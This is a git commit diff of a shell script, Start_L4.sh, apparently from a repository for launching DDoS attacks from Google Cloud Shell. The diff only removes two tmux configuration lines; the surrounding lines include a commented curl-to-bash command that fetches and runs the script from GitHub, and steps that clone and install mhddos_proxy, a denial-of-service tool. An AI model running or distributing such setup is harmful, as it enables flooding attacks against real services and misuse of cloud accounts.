9397db568edc208f36697bc82a6b6aca47138cdc
Operation-Stop-russia <103530329+Operation-Stop-russia@users.noreply.github.com>
2022-04-18 05:42:41 +0300

    Update Start_L4.sh

--- Start_L4.sh
+++ Start_L4.sh
@@ -1,9 +1,6 @@
 #!/bin/bash
 #curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_L4.sh | bash
 
-sudo grep -qxF 'set -g mouse on' ~/.tmux.conf || echo 'set -g mouse on' >> ~/.tmux.conf
-tmux source-file ~/.tmux.conf
-
 git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
 cd mhddos_proxy
 python3 -m pip install -r requirements.txt
